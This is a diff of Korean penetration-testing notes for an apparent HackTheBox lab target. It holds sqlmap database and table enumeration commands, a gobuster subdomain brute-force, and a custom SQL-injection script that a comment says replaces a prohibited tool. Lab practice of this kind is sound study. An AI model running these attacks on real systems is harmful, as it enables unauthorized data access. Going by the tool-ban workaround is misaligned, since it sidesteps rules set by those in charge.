@@ -112,19 +112,19 @@ sqlmap -u "http://planning.htb/detail.php?id=1" --dbs --batch
 # 지정한 DB의 모든 테이블 이름 추출
 sqlmap -u "http://planning.htb/detail.php?id=1" -D database_name --tables --batch
 
+# SQL 인젝션 사용 금지로 인해 자체 스크립트 사용
+/vpn/scan/SQLi.sh -u "http://planning.htb/detail.php?id=1" --payloads /vpn/SQLi
+
+
+
 # 고부스터용 파일 합치기 서브도메인 DNS
 cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt \
     > /tmp/combined_subdomains.txt
 
-
-# SQL 인젝션 사용 금지로 인해 자체 스크립트 사용
-/vpn/scan/SQLi.sh -u "http://planning.htb/detail.php?id=1" --payloads /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-    /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt
-
-
-
 gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_result.txt
+
+
 
 ##### 서브도메인 검색 결과
 
